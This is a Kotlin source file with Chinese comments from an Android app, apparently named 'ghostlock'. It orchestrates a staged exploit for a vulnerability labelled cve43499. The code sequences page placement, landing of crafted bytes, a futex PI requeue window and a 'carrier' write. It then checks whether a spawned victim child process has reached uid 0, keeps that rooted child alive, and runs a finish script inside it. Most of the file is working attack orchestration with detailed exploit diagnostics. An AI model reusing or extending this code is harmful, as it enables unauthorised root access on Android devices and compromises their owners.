package com.ghostlock.app.backend.cve43499.lifecycle

import com.ghostlock.app.backend.cve43499.owned.ActorExecuteOutcome
import com.ghostlock.app.backend.cve43499.owned.ActorOwner
import com.ghostlock.app.backend.cve43499.owned.Cve43499PrebuiltDiscardReceipt
import com.ghostlock.app.backend.cve43499.owned.Cve43499PrebuiltRepair
import com.ghostlock.app.backend.cve43499.owned.Cve43499PrebuiltRepairState
import com.ghostlock.app.backend.cve43499.owned.ActorPreparation
import com.ghostlock.app.backend.cve43499.owned.ActorPrepareOutcome
import com.ghostlock.app.backend.cve43499.owned.LandingConfig
import com.ghostlock.app.backend.cve43499.owned.Native43499CallStatus
import com.ghostlock.app.backend.cve43499.owned.LandingOutcome
import com.ghostlock.app.backend.cve43499.owned.OwnerCloseOutcome
import com.ghostlock.app.backend.cve43499.owned.PageOwner
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.backend.cve43499.owned.PrebuiltLandingOutcome
import com.ghostlock.app.backend.cve43499.owned.PlacementOwner
import com.ghostlock.app.backend.cve43499.owned.PlacementPrepareOutcome
import com.ghostlock.app.backend.cve43499.victim.ProcessVictimSession
import com.ghostlock.app.backend.cve43499.victim.VictimFinishResult
import com.ghostlock.app.backend.cve43499.victim.VictimSession
import com.ghostlock.app.backend.cve43499.victim.VictimStartResult
import com.ghostlock.app.backend.cve43499.victim.VictimUidResult

/**
 * Placement 事务回传的只读物理事实（post-placement generator 的唯一输入）。
 *
 * 目的：landing 字节/几何与 Carrier 地址必须由**已定位到的**候选页基址派生
 * （legacy2 `support.cpp:417-451`、`route_multicast.cpp:76-91`）；在 placement
 * 之前生成属于依赖倒置（R3 审计共性 1 / B1）。本类型是生命周期层向 Flow 暴露的
 * 稳定事实快照，不含 token、不可回写 Native。
 *
 * @property candidatePageBase Native 实测候选页基址。
 * @property pageSize 候选布局页大小。
 * @property allocationSize 候选分配大小。
 * @property requiredAlignment 候选基址要求的额外对齐。
 * @property measuredObjectAddress 测量命中的对象地址（stamp/地址派生证据）。
 * @property measurementRounds 定位测量实际轮数。
 * @property retainedChildCount Placement 仍保留的 child 数（终结证据）。
 * @property retainedDescriptorCount Placement 仍保留的 fd 数（终结证据）。
 * @note 阶段：R3a-1；由 [Cve43499Lifecycle.preparePlacement] 从 Native 回执构造。
 */
internal data class Cve43499PlacementFacts(
    val candidatePageBase: Long,
    val pageSize: Long,
    val allocationSize: Long,
    val requiredAlignment: Long,
    val measuredObjectAddress: Long,
    val measurementRounds: Long,
    val retainedChildCount: Long,
    val retainedDescriptorCount: Long,
)

/**
 * Placement 步骤的具名结局（生命周期层对 Flow 暴露的稳定结果）。
 *
 * @note 阶段：task-32；R3a-1 起 [Prepared] 同时携带 post-placement facts，
 *   Flow 只依赖本层的 typed 结果，不感知 owner 细节。
 */
internal sealed interface Cve43499PlacementStep {
    /**
     * 定位事务完成。
     *
     * @property rounds 实际测量轮数（物理回执）。
     * @property facts 供 post-placement generator 使用的只读事实快照。
     */
    data class Prepared(
        val rounds: Long,
        val facts: Cve43499PlacementFacts,
    ) : Cve43499PlacementStep

    /** 具名失败；[reason] 稳定可检索。 */
    data class Failed(val reason: String) : Cve43499PlacementStep
}

/**
 * Landing（Placement→Page 转移）步骤的具名结局。
 *
 * @note 阶段：task-32；R3d 起 [CleanFailure] 与 [ConsumedDirty] 分离，
 *   供多写链区分「可重试的 clean failure」与「保留闭包的 dirty」。
 */
internal sealed interface Cve43499LandingStep {
    /**
     * 落页成功；[reclaimSends] 为实际 reclaim sendmsg 次数。
     * @property actualPageBase Native 回执的实际落页基址（0=旧回执/未提供；task-123 诊断）。
     */
    data class Landed(
        val reclaimSends: Long,
        val actualPageBase: Long = 0L,
    ) : Cve43499LandingStep

    /** 提交前 clean failure：Placement 未被消费（可重试/可关闭）。 */
    data class CleanFailure(val reason: String) : Cve43499LandingStep

    /** dirty/indeterminate：Placement 已消费且闭包保留到进程退出（不可重试）。 */
    data class ConsumedDirty(val reason: String) : Cve43499LandingStep

    /** 具名失败（非 clean/dirty 的具名拒绝）。 */
    data class Failed(val reason: String) : Cve43499LandingStep
}

/**
 * prepareActor（Page→Actor 转移）步骤的具名结局。
 *
 * @note 阶段：task-32；R3d 起区分 clean failure 与 dirty。
 */
internal sealed interface Cve43499ActorPrepareStep {
    /** 准备成功；[primitiveKind] 为实际绑定的 Carrier 种类（日志/证据用）。 */
    data class Prepared(val primitiveKind: String) : Cve43499ActorPrepareStep

    /** 提交前 clean failure：Page 未被消费（可重试/可关闭）。 */
    data class CleanFailure(val reason: String) : Cve43499ActorPrepareStep

    /** dirty/indeterminate：Page 已消费且闭包保留到进程退出（不可重试）。 */
    data class ConsumedDirty(val reason: String) : Cve43499ActorPrepareStep

    /** 具名失败。 */
    data class Failed(val reason: String) : Cve43499ActorPrepareStep
}

/**
 * executeActor 的纯物理观测（生命周期层剥离 DTO 细节后的稳定事实）。
 *
 * @property consumerSuccess consumer 成功计数（Carrier 观察到有效写的判据）。
 * @property consumerCalls consumer 调用计数。
 * @property carrierArmed Carrier 是否 arm。
 * @property windowOpened PI 窗口是否打开。
 * @property carrierOperations Carrier 中性操作计数。
 * @property carrierLastStep Carrier 最后 step（失败定位）。
 * @property carrierLastErrno Carrier 最后 errno。
 * @property retainedForProcessExit 是否保留闭包到进程退出。
 * @note 阶段：R3d；只表达物理事实，不宣布 uid/root。
 */
internal data class Cve43499ExecuteFacts(
    val consumerSuccess: Long,
    val consumerCalls: Long,
    val carrierArmed: Boolean,
    val windowOpened: Boolean,
    val carrierOperations: Long,
    val carrierLastStep: Int,
    val carrierLastErrno: Int,
    val retainedForProcessExit: Boolean,
)

/**
 * executeActor（PI 窗口）步骤的具名结局。
 *
 * @note 阶段：task-32；R3d 起 [Executed] 携带完整物理事实，[CleanFailure] 供多写链
 *   识别「路由 clean failure 可重试」。
 */
internal sealed interface Cve43499ActorExecuteStep {
    /** 窗口执行完成且观察到有效写。 */
    data class Executed(val facts: Cve43499ExecuteFacts) : Cve43499ActorExecuteStep {
        /** @return consumer 成功计数（兼容 R3b 调用方）。 */
        val consumerSuccess: Long get() = facts.consumerSuccess
    }

    /** 有效回执但未观察到有效写（路由 clean failure，可重试）。 */
    data class CleanFailure(val reason: String) : Cve43499ActorExecuteStep

    /** dirty/indeterminate：Native 保留闭包到进程退出（不可重试）。 */
    data class ConsumedDirty(val reason: String) : Cve43499ActorExecuteStep

    /** 具名失败。 */
    data class Failed(val reason: String) : Cve43499ActorExecuteStep
}

/**
 * victim 身份快照（生命周期层对 Flow 暴露，不泄漏 victim 包类型）。
 *
 * @property pid 子进程 PID。
 * @property startTimeTicks `/proc/<pid>/stat` 第 22 字段（boot 起 tick 数）。
 * @property uid 读回的 uid。
 * @note 阶段：task-33。
 */
internal data class Cve43499VictimSnapshot(
    val pid: Int,
    val startTimeTicks: Long,
    val uid: Long,
)

/**
 * victim uid 探测结果（只表达物理读回，不宣布业务成功）。
 *
 * @property uid 读回的 uid；null 表示失败。
 * @property failureReason 失败原因；uid 非 null 时忽略。
 * @note 阶段：task-32。
 */
internal data class Cve43499UidProbe(val uid: Long?, val failureReason: String?)

/**
 * 单条写链（Placement→Page→Actor）的 close 回执。
 *
 * @property termination 具名终结证据（actor/page/placement 各自结局）。
 * @property allReleased 该链资源是否全部干净释放。
 * @property retained 是否有 Native 保留闭包（dirty）。
 * @note 阶段：R3d：多写链按链终结，不再一次性关闭全部。
 */
internal data class Cve43499ChainCloseReceipt(
    val termination: String,
    val allReleased: Boolean,
    val retained: Boolean,
)

/**
 * closeAll 的资源终结回执（不含业务成功主张）。
 *
 * @property termination 具名终结证据（每条链 + victim 的结局）。
 * @property allReleased 全部资源是否都已干净释放（rooted child 按用户指令驻留不算泄漏）。
 * @property retained 是否有任何 Native 保留闭包（dirty）。
 * @property parkedRootedChild true=rooted victim 按 task-45 只 detach（`park` 驻留，不杀）。
 * @note 阶段：task-32 / R3d（多链聚合）/ R3f（rooted child detach）。
 */
internal data class Cve43499LifecycleReceipt(
    val termination: String,
    val allReleased: Boolean,
    val retained: Boolean,
    val parkedRootedChild: Boolean = false,
)

/**
 * 43499 的**唯一生命周期管理层**：集中持有/转移/关闭线性资源链
 * （PlacementOwner → PageOwner → ActorOwner + victim 会话）。
 *
 * R3d 多写链（W1/W1b/W2/W2b/W3 各自一次事务）要求同时持有 >1 条链：W1 的链在 W1b
 * 修复期间必须保持打开（legacy quarantine 语义），因此本层改为**链列表** + 每次
 * `preparePlacement` 新建一条链；`landPage/prepareActor/executeActor` 作用于最后一条
 * 链；`closeChain` 终结最后一条链（成功/失败都可用），`closeAll` 从新到旧终结全部。
 *
 * @param victimFactory victim 会话工厂 seam（宿主验证可注入 fake）。
 * @note 阶段：task-32 / R3d；真机未验证。
 */
internal class Cve43499Lifecycle(
    private val victimFactory: () -> VictimSession = { ProcessVictimSession() },
    private val elapsedRealtimeNanos: () -> Long = {
        android.os.SystemClock.elapsedRealtimeNanos()
    },
) : Cve43499LifecycleApi {
    /** 一条写链的三段 owner（按 Placement→Page→Actor 转移；null 表示已转移/已终结）。 */
    private class Chain {
        var placement: PlacementOwner? = null
        var page: PageOwner? = null
        var actor: ActorOwner? = null
        var retained: Boolean = false
        var closed: Boolean = false
    }

    private val chains: ArrayDeque<Chain> = ArrayDeque()
    private var victim: VictimSession? = null

    /** G05：最多 1 条 prebuilt repair 链（不入 active chains；closeAll 顺序 active→prebuilt→victim）。 */
    private var prebuilt: Cve43499PrebuiltRepair? = null

    /**
     * 启动 victim 会话（幂等）。
     *
     * @return null 表示成功；否则为具名失败原因。
     */
    override fun startVictim(): String? {
        /* task-84：幂等——已启动则 no-op，不得双重 spawn。 */
        if (victim != null) return null
        val session = runCatching { victimFactory() }.getOrElse { problem ->
            return "victim-start:create"
        }
        victim = session
        return when (val started = session.startDetailed()) {
            VictimStartResult.Ok -> null
            is VictimStartResult.Failed -> started.reason
        }
    }

    /**
     * 执行 Placement 定位事务并接管 owner（新开一条写链）。
     *
     * @param config Placement 物理参数。
     * @return typed 步骤结果；[Cve43499PlacementStep.Prepared] 携带回传事实
     *   （candidatePageBase/几何/测量计数），供 Flow 在落页前生成 landing/Carrier。
     */
    override fun preparePlacement(config: PlacementConfig): Cve43499PlacementStep {
        val chain = Chain()
        chains.addLast(chain)
        return when (val outcome = PlacementOwner.prepare(config)) {
            is PlacementPrepareOutcome.Prepared -> {
                chain.placement = outcome.owner
                val receipt = outcome.receipt
                Cve43499PlacementStep.Prepared(
                    rounds = receipt.measurementRounds,
                    facts = Cve43499PlacementFacts(
                        candidatePageBase = receipt.candidatePageBase,
                        pageSize = receipt.pageSize,
                        allocationSize = receipt.allocationSize,
                        requiredAlignment = receipt.requiredAlignment,
                        measuredObjectAddress = receipt.measuredObjectAddress,
                        measurementRounds = receipt.measurementRounds,
                        retainedChildCount = receipt.retainedChildCount,
                        retainedDescriptorCount = receipt.retainedDescriptorCount,
                    ),
                )
            }
            is PlacementPrepareOutcome.Refused -> {
                /* 未创建 owner：移除空链，保持「链数=在手 owner 数」。
                 * task-95：透出 JNI 回执 callStatus/system_error（区分 ENOMEM/EAGAIN 等）。 */
                chains.removeLast()
                Cve43499PlacementStep.Failed(
                    "placement:" + outcome.reason + placementReceiptDetail(outcome.receipt),
                )
            }
        }
    }

    /**
     * 消费最后一条链的 Placement 并落页，接管 Page owner。
     *
     * @param config landing 物理参数与最终字节。
     * @return typed 步骤结果。
     */
    override fun landPage(config: LandingConfig): Cve43499LandingStep {
        val chain = chains.lastOrNull()
            ?: return Cve43499LandingStep.Failed("landing:not-accepted")
        val owner = chain.placement ?: return Cve43499LandingStep.Failed("landing:not-accepted")
        return when (val outcome = owner.landPage(config)) {
            is LandingOutcome.Landed -> {
                chain.placement = null
                chain.page = outcome.owner
                Cve43499LandingStep.Landed(
                    reclaimSends = outcome.receipt.reclaimSendCount,
                    actualPageBase = outcome.receipt.actualPageBase,
                )
            }
            is LandingOutcome.ReceiptIncomplete ->
                Cve43499LandingStep.Failed("landing:receipt-incomplete")
            is LandingOutcome.Rejected ->
                Cve43499LandingStep.Failed("landing:" + outcome.reason)
            LandingOutcome.NotAccepted -> Cve43499LandingStep.Failed("landing:not-accepted")
            is LandingOutcome.CleanFailure -> {
                /* 提交前 clean failure：Placement token 已恢复，链仍持有 placement
                 * 供调用方重试或 closeChain 释放。task-93：透出 JNI 回执
                 * callStatus/system_error 供真机诊断（不改变 CleanFailure 语义）。 */
                Cve43499LandingStep.CleanFailure(
                    "landing:clean-failure:call=" +
                        Native43499CallStatus.name(outcome.receipt.callStatus) +
                        ":errno=" + outcome.receipt.systemError,
                )
            }
            is LandingOutcome.ConsumedDirty -> {
                chain.placement = null
                chain.retained = true
                Cve43499LandingStep.ConsumedDirty("landing:dirty")
            }
        }
    }

    /**
     * 消费最后一条链的 Page 并准备 Actor，接管 Actor owner。
     *
     * @param preparation Actor 调度与 Carrier 参数。
     * @return typed 步骤结果。
     */
    override fun prepareActor(preparation: ActorPreparation): Cve43499ActorPrepareStep {
        val chain = chains.lastOrNull()
            ?: return Cve43499ActorPrepareStep.Failed("prepare-actor:not-accepted")
        val owner = chain.page
            ?: return Cve43499ActorPrepareStep.Failed("prepare-actor:not-accepted")
        return when (val outcome = owner.prepareActor(preparation)) {
            is ActorPrepareOutcome.Prepared -> {
                chain.page = null
                chain.actor = outcome.owner
                Cve43499ActorPrepareStep.Prepared(outcome.receipt.primitiveKind.toString())
            }
            is ActorPrepareOutcome.ReceiptIncomplete ->
                Cve43499ActorPrepareStep.Failed("prepare-actor:receipt-incomplete")
            is ActorPrepareOutcome.Rejected ->
                Cve43499ActorPrepareStep.Failed("prepare-actor:" + outcome.reason)
            ActorPrepareOutcome.NotAccepted ->
                Cve43499ActorPrepareStep.Failed("prepare-actor:not-accepted")
            is ActorPrepareOutcome.CleanFailure -> {
                /* clean failure：Page token 已恢复，链仍持有 page。
                 * task-97：透出 JNI 回执（call/errno/ready/consumed）供真机诊断。 */
                Cve43499ActorPrepareStep.CleanFailure(
                    "prepare-actor:clean-failure" + actorPrepareReceiptDetail(outcome.receipt),
                )
            }
            is ActorPrepareOutcome.ConsumedDirty -> {
                chain.page = null
                chain.retained = true
                Cve43499ActorPrepareStep.ConsumedDirty("prepare-actor:dirty")
            }
        }
    }

    /**
     * 打开唯一一次 PI 窗口并执行最后一条链的 Actor。
     *
     * @return typed 步骤结果（携带完整物理事实）。
     */
    override fun executeActor(): Cve43499ActorExecuteStep {
        val chain = chains.lastOrNull()
            ?: return Cve43499ActorExecuteStep.Failed("actor-execute:not-accepted")
        val owner = chain.actor
            ?: return Cve43499ActorExecuteStep.Failed("actor-execute:not-accepted")
        return when (val outcome = owner.execute()) {
            is ActorExecuteOutcome.Executed -> Cve43499ActorExecuteStep.Executed(
                Cve43499ExecuteFacts(
                    consumerSuccess = outcome.receipt.consumerSuccessCount,
                    consumerCalls = outcome.receipt.consumerCallCount,
                    carrierArmed = outcome.receipt.carrierArmed,
                    windowOpened = outcome.receipt.windowOpened,
                    carrierOperations = outcome.receipt.carrierOperations,
                    carrierLastStep = outcome.receipt.carrierLastStep,
                    carrierLastErrno = outcome.receipt.carrierLastErrno,
                    retainedForProcessExit = outcome.receipt.retainedForProcessExit,
                ),
            )
            is ActorExecuteOutcome.ReceiptIncomplete ->
                Cve43499ActorExecuteStep.Failed("actor-execute:receipt-incomplete")
            is ActorExecuteOutcome.Rejected ->
                Cve43499ActorExecuteStep.Failed("actor-execute:" + outcome.reason)
            ActorExecuteOutcome.NotAccepted ->
                Cve43499ActorExecuteStep.Failed("actor-execute:not-accepted")
            is ActorExecuteOutcome.CleanFailure ->
                Cve43499ActorExecuteStep.CleanFailure(
                    "actor-execute:clean-failure" + actorExecuteReceiptDetail(outcome.receipt),
                )
            is ActorExecuteOutcome.Dirty -> {
                chain.retained = true
                Cve43499ActorExecuteStep.ConsumedDirty(
                    "actor-execute:dirty" + actorExecuteReceiptDetail(outcome.receipt),
                )
            }
        }
    }

    /**
     * 终结最后一条写链（成功/失败路径都可调用；Actor→Page→Placement 顺序）。
     *
     * @return 单链 close 回执；没有打开链时返回 skipped 证据。
     * @note 幂等：同一链只会被终结一次；dirty/retained 不猜测回收。
     */
    override fun closeChain(): Cve43499ChainCloseReceipt {
        val chain = chains.removeLastOrNull()
            ?: return Cve43499ChainCloseReceipt(
                termination = "chain=skipped;",
                allReleased = true,
                retained = false,
            )
        return closeChainInternal(chain)
    }

    /**
     * 终结全部写链（从新到旧）与 victim，返回具名回执。
     *
     * @return 终结证据 + 是否全部干净释放 + 是否有保留闭包。
     * @note 幂等：重复调用只返回 skipped 证据；dirty/retained 不重试、不猜测回收。
     */
    override fun closeAll(): Cve43499LifecycleReceipt {
        var allReleased = true
        var retained = false
        val note = StringBuilder()
        var index = 0
        while (chains.isNotEmpty()) {
            val receipt = closeChainInternal(chains.removeLast())
            note.append("chain").append(index).append(':')
                .append(receipt.termination)
            if (!receipt.allReleased) allReleased = false
            if (receipt.retained) retained = true
            index++
        }
        /* D6 顺序：active chains(newest→oldest) → prebuilt → victim(rooted detach)。 */
        prebuilt?.let { holder ->
            val receipt = holder.discard()
            prebuilt = null
            note.append(receipt.termination)
            if (!receipt.clean) allReleased = false
            if (receipt.retained) retained = true
        }
        val session = victim
        var parkedRootedChild = false
        if (session != null && session.rooted) {
            /* task-45：rooted child 不杀。只请求 park 并释放会话引用；不 close 流/不
             * destroy。park 未确认也绝不 kill（证据记录为 unconfirmed，交真机复核）。 */
            val parked = runCatching { session.detachRooted() }.getOrDefault(false)
            parkedRootedChild = true
            note.append(if (parked) {
                "victim=rooted-child-parked;"
            } else {
                "victim=rooted-child-parked-unconfirmed;"
            })
        } else {
            val victimClosed = session?.let { runCatching { it.close() }.isSuccess } ?: true
            if (victimClosed) {
                note.append("victim=closed;")
            } else {
                note.append("victim=close-threw;")
                allReleased = false
            }
        }
        victim = null
        return Cve43499LifecycleReceipt(
            termination = note.toString(),
            allReleased = allReleased,
            retained = retained,
            parkedRootedChild = parkedRootedChild,
        )
    }

    /**
     * 终结单条链：actor→page→placement；异常映射为具名 rejected。
     *
     * @param chain 待终结链。
     * @return 单链 close 回执。
     */
    private fun closeChainInternal(chain: Chain): Cve43499ChainCloseReceipt {
        if (chain.closed) {
            return Cve43499ChainCloseReceipt("chain=already-closed;", true, chain.retained)
        }
        chain.closed = true
        var allReleased = !chain.retained
        val note = StringBuilder()
        chain.actor?.let { owner ->
            val outcome = closeSafely { owner.closeDetailed() }
            note.append("actor=").append(closeName(outcome)).append(';')
            if (outcome !is OwnerCloseOutcome.Released) allReleased = false
        } ?: note.append("actor=skipped;")
        chain.page?.let { owner ->
            val outcome = closeSafely { owner.closeDetailed() }
            note.append("page=").append(closeName(outcome)).append(';')
            if (outcome !is OwnerCloseOutcome.Released) allReleased = false
        } ?: note.append("page=skipped;")
        chain.placement?.let { owner ->
            val outcome = closeSafely { owner.closeDetailed() }
            note.append("placement=").append(closeName(outcome)).append(';')
            if (outcome !is OwnerCloseOutcome.Released) allReleased = false
        } ?: note.append("placement=skipped;")
        /* 释放本层引用；dirty/retained 的 Native 闭包由进程退出兜底，不在此猜测回收。 */
        chain.actor = null
        chain.page = null
        chain.placement = null
        return Cve43499ChainCloseReceipt(note.toString(), allReleased, chain.retained)
    }

    /* ==================================================================== */
    /* G05 prebuilt repair（Native 零改动；只组合既有 owner/close 原语）        */
    /* ==================================================================== */

    /**
     * 预建 repair placement（单独 holder，不入 active chains）。
     *
     * @param config Placement 物理参数。
     * @return Prepared（facts）/ Failed（已有 prebuilt 或 Native 拒绝）。
     */
    override fun prebuildRepairPlacement(config: PlacementConfig): Cve43499PlacementStep {
        if (prebuilt != null) {
            return Cve43499PlacementStep.Failed("prebuild:already-exists")
        }
        return when (val outcome = PlacementOwner.prepare(config)) {
            is PlacementPrepareOutcome.Prepared -> {
                val holder = Cve43499PrebuiltRepair(elapsedRealtimeNanos())
                holder.attachPlacement(outcome.owner)
                prebuilt = holder
                val receipt = outcome.receipt
                Cve43499PlacementStep.Prepared(
                    rounds = receipt.measurementRounds,
                    facts = Cve43499PlacementFacts(
                        candidatePageBase = receipt.candidatePageBase,
                        pageSize = receipt.pageSize,
                        allocationSize = receipt.allocationSize,
                        requiredAlignment = receipt.requiredAlignment,
                        measuredObjectAddress = receipt.measuredObjectAddress,
                        measurementRounds = receipt.measurementRounds,
                        retainedChildCount = receipt.retainedChildCount,
                        retainedDescriptorCount = receipt.retainedDescriptorCount,
                    ),
                )
            }
            is PlacementPrepareOutcome.Refused ->
                Cve43499PlacementStep.Failed(
                    "prebuild:placement:" + outcome.reason +
                        placementReceiptDetail(outcome.receipt),
                )
        }
    }

    /**
     * 预建 repair landing（PLACEMENT_READY → PAGE_READY；失败保持 holder 供 discard）。
     *
     * @param config landing 参数与最终字节。
     * @return typed landing 结局。
     */
    override fun landPrebuildRepair(config: LandingConfig): Cve43499LandingStep {
        val holder = prebuilt
            ?: return Cve43499LandingStep.Failed("prebuild:not-ready")
        if (holder.currentState != Cve43499PrebuiltRepairState.PLACEMENT_READY) {
            return Cve43499LandingStep.Failed("prebuild:state:" + holder.currentState.name.lowercase())
        }
        return when (val outcome = holder.land(config)) {
            is PrebuiltLandingOutcome.Landed -> Cve43499LandingStep.Landed(outcome.reclaimSends)
            is PrebuiltLandingOutcome.CleanFailure ->
                Cve43499LandingStep.CleanFailure("prebuild:landing:clean-failure")
            is PrebuiltLandingOutcome.Dirty -> Cve43499LandingStep.ConsumedDirty("prebuild:landing:dirty")
            is PrebuiltLandingOutcome.Rejected ->
                Cve43499LandingStep.Failed("prebuild:landing:" + outcome.reason)
        }
    }

    /**
     * 激活 prebuilt 页到 active chain 尾部（只转移 Page；Actor 不预建）。
     *
     * @return Activated（含 prebuilt 创建时间）/ Failed（状态非法/retained）。
     */
    override fun activatePrebuiltRepair(): Cve43499PrebuiltActivationStep {
        val holder = prebuilt
            ?: return Cve43499PrebuiltActivationStep.Failed("prebuild:not-ready", false)
        val owner = holder.takePageForActivation()
        if (owner == null) {
            return Cve43499PrebuiltActivationStep.Failed(
                "prebuild:state:" + holder.currentState.name.lowercase(),
                holder.retained,
            )
        }
        val chain = Chain()
        chain.page = owner
        chains.addLast(chain)
        holder.markActivated()
        return Cve43499PrebuiltActivationStep.Activated(holder.createdNanos)
    }

    /**
     * clean/dirty discard prebuilt 链。
     *
     * @return discard 回执（clean/retained/termination）。
     */
    override fun discardPrebuiltRepair(): Cve43499PrebuiltDiscardReceipt {
        val holder = prebuilt
            ?: return Cve43499PrebuiltDiscardReceipt(
                clean = true,
                retained = false,
                termination = "prebuilt=absent;",
            )
        prebuilt = null
        return holder.discard()
    }

    /** @return true=PAGE_READY（可 activation）。 */
    override fun prebuiltRepairAvailable(): Boolean = prebuilt?.available == true

    /**
     * @return victim 身份快照（PID/starttime/uid）；未启动或读取失败返回 null。
     */
    override fun victimSnapshot(): Cve43499VictimSnapshot? {
        val identity = victim?.identity() ?: return null
        return Cve43499VictimSnapshot(
            pid = identity.pid,
            startTimeTicks = identity.startTimeTicks,
            uid = identity.uid,
        )
    }

    /**
     * 探测 victim uid（有界；只做证据）。
     *
     * @return uid 探测结果。
     */
    override fun victimUid(): Cve43499UidProbe {
        val session = victim ?: return Cve43499UidProbe(null, "victim-session-missing")
        return when (val result = session.uid()) {
            is VictimUidResult.Ok -> Cve43499UidProbe(result.uid, null)
            is VictimUidResult.Failed -> Cve43499UidProbe(null, result.reason)
        }
    }

    /**
     * @return true=曾观察到 victim uid==0（rooted child）。
     */
    override fun victimRooted(): Boolean = victim?.rooted == true

    /**
     * 在 rooted victim 内执行 finish 脚本（R3f）。
     *
     * @param scriptPath handoff 冻结的脚本绝对路径。
     * @param timeoutMs 有界等待（毫秒；必须 >0）。
     * @return 退出码+输出摘要或具名失败。
     */
    override fun victimFinish(scriptPath: String, timeoutMs: Long): VictimFinishResult {
        val session = victim ?: return VictimFinishResult.Failed("victim-finish:not-started")
        return session.finish(scriptPath, timeoutMs)
    }

    override fun actorDebugSnapshot(): LongArray? =
        chains.lastOrNull()?.actor?.debugSnapshot()

    override fun victimStatus(): ByteArray? = victim?.status()

    override fun victimCommSet(marker: String): Boolean = victim?.commSet(marker) ?: false

    override fun victimComm(): Pair<Int, ByteArray>? = victim?.comm()

    /**
     * 关闭并重建 victim 会话（legacy W3 链轮次 >1 的重生成；R3d seam）。
     *
     * @return null 表示成功；否则为具名失败原因。
     * @note 不猜测旧 victim 的 park 语义（victim 协议命令不在本批）；由调用方持有
     *   [Cve43499VictimRestarter] seam，本方法只做 close→start。
     */
    internal fun restartVictim(): String? {
        runCatching { victim?.close() }
        victim = null
        return startVictim()
    }

    /**
     * 把 close 调用包成不抛异常的形式；异常映射为具名 Rejected。
     *
     * @param block owner 的 closeDetailed 调用。
     * @return 具名 close 结局。
     */
    /**
     * task-97：Actor execute 失败回执细节（Native43499ActorExecuteResult 实字段）。
     *
     * @param receipt JNI 回执。
     * @return 稳定 detail 串（call/errno/consumer/carrier 定位）。
     */
    private fun actorExecuteReceiptDetail(
        receipt: com.ghostlock.app.jni.Native43499ActorExecuteResult,
    ): String = ":call=" + Native43499CallStatus.name(receipt.callStatus) +
        ":errno=" + receipt.systemError +
        ":consumer_success=" + receipt.consumerSuccessCount +
        "/" + receipt.consumerCallCount +
        ":carrier_armed=" + receipt.carrierArmed +
        ":window_opened=" + receipt.windowOpened +
        ":carrier_ops=" + receipt.carrierOperations +
        ":carrier_step=" + receipt.carrierLastStep +
        ":carrier_errno=" + receipt.carrierLastErrno +
        ":retained=" + receipt.retainedForProcessExit +
        ":diag_stage=" + receipt.diagStage +
        ":fail_stage=" + receipt.diagFailStage +
        ":requeue_ret=" + receipt.diagRequeueRet +
        ":requeue_errno=" + receipt.diagRequeueErrno +
        ":publish_count=" + receipt.diagPublishCount +
        ":requeue_calls=" + receipt.diagRequeueCalls +
        ":diag_version=0x" + Integer.toHexString(receipt.diagVersion) +
        ":waiter_waiting=" + receipt.diagWaiterWaiting +
        ":owner_started=" + receipt.diagOwnerStarted +
        ":requeue_expected=" + receipt.diagRequeueExpected +
        ":wait_ret=" + receipt.diagWaiterWaitRet +
        ":wait_errno=" + receipt.diagWaiterWaitErrno +
        ":in_futex=" + receipt.diagWaiterInFutex +
        ":dispatched=" + receipt.diagWaiterDispatched +
        ":target_value=" + receipt.diagTargetValueAtRequeue +
        ":ts_settle=" + receipt.diagTsSettleDoneNs +
        ":ts_wenter=" + receipt.diagTsWaiterEnterNs +
        ":ts_wexit=" + receipt.diagTsWaiterExitNs +
        ":ts_requeue=" + receipt.diagTsRequeueNs +
        ":parked_timeout_ns=" + receipt.diagParkedTimeoutNs +
        ":setup_settle_us=" + receipt.diagSetupSettleUs +
        ":poll_us=" + receipt.diagPollUs +
        ":prepare_timeout_ns=" + receipt.diagPrepareTimeoutNs +
        ":futex_op=" + receipt.diagFutexOp +
        ":futex_val=" + receipt.diagFutexVal +
        ":uaddr2=" + receipt.diagFutexUaddr2 +
        ":val3=" + receipt.diagFutexVal3 +
        ":owner_tid=" + receipt.diagOwnerTid

    /**
     * task-97：Actor prepare 失败回执细节。
     *
     * @param receipt JNI 回执。
     * @return 稳定 detail 串（call/errno/ready flags）。
     */
    private fun actorPrepareReceiptDetail(
        receipt: com.ghostlock.app.jni.Native43499ActorPrepareResult,
    ): String = ":call=" + Native43499CallStatus.name(receipt.callStatus) +
        ":errno=" + receipt.systemError +
        ":page_consumed=" + receipt.pageConsumed +
        ":owner_ready=" + receipt.ownerReady +
        ":waiter_ready=" + receipt.waiterReady +
        ":consumer_ready=" + receipt.consumerReady

    /**
     * task-95：Placement 失败回执细节（callStatus/system_error），用于真机 errno 诊断。
     *
     * @param receipt JNI placement 回执；null 表示未触 Native（无 detail）。
     * @return 空串或 `:call=<name>:errno=<n>`。
     */
    private fun placementReceiptDetail(
        receipt: com.ghostlock.app.jni.Native43499PlacementResult?,
    ): String = if (receipt == null) {
        ""
    } else {
        ":call=" + Native43499CallStatus.name(receipt.callStatus) +
            ":errno=" + receipt.systemError +
            ":diag_step=" + receipt.diagStep +
            ":diag_syscall=" + receipt.diagSyscall +
            ":diag_errno=" + receipt.diagErrno +
            ":child_reaped=" + receipt.diagChildReaped +
            ":child_status=" + receipt.diagChildStatus +
            ":child_proc=" + receipt.diagChildProcExists +
            ":child_uid=" + receipt.diagChildUid +
            ":open_errno=" + receipt.diagOpenErrno +
            ":child_pid=" + receipt.diagChildPid
    }

    private fun closeSafely(block: () -> OwnerCloseOutcome): OwnerCloseOutcome =
        runCatching(block).getOrElse { problem ->
            OwnerCloseOutcome.Rejected(
                "close-threw:" + (problem.message ?: problem.javaClass.simpleName),
            )
        }

    /**
     * @param outcome close 结局。
     * @return 稳定可检索的终结证据名。
     */
    private fun closeName(outcome: OwnerCloseOutcome): String = when (outcome) {
        is OwnerCloseOutcome.Released -> "released"
        is OwnerCloseOutcome.Retained -> "retained"
        is OwnerCloseOutcome.ReceiptIncomplete -> "receipt-incomplete"
        OwnerCloseOutcome.NotAccepted -> "not-accepted"
        is OwnerCloseOutcome.Rejected -> "rejected"
    }
}
